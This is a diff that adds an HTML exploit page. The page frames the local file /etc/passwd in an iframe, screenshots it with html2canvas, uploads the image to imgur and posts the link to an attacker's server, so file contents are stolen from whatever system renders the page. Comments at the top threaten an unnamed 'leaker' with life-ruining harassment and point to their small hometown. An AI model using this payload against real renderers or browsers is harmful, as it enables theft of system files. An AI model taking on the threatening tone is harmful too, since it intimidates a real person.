@@ -1,0 +1,46 @@
+<!doctype HTML>
+<html>
+
+<head>
+  
+  <!-- NOTE: To the skidiot who leaked this, just remember that there are only 7000 people living in Heber Springs, Arkansas. -->
+  <!-- You're lucky I've turned over a new leaf otherwise you'd be getting hit with some /i/ style ruin life tactics right now. --> 
+
+	<title>lolol</title>
+	<script src="https://html2canvas.hertzen.com/dist/html2canvas.js"></script>
+</head>
+
+<body>
+	<h2>Don't mind me, I'm just reading the contents of your iframe</h2>
+	<p>... and uploading it to imgur</p>
+	<br />
+	<div id="getRekt">
+		<iframe src="file:///etc/passwd" width="666" height="5000" frameborder="0">oh, to live in a godless and frameless society..</iframe>
+	</div>
+	<!-- not implemented here, but we need the data base64'd then decoded @ server-side -->
+	<script>
+	html2canvas(document.querySelector("#getRekt")).then(function(canvas) {
+	var dataURL = canvas.toDataURL();
+	$.ajax({
+		url: 'https://api.imgur.com/3/image',
+		type: 'post',
+		headers: {
+			Authorization: 'yourauthcode'
+		},
+		data: {
+			image: dataURL
+		},
+		dataType: 'json',
+		success: function(response) {
+			if(response.success) {
+				// Post the imgur url to your server.
+				$.post("yourlinkuploadserver", response.data.link);
+			}
+		}
+	});
+	});
+	});
+	</script>
+</body>
+
+</html>
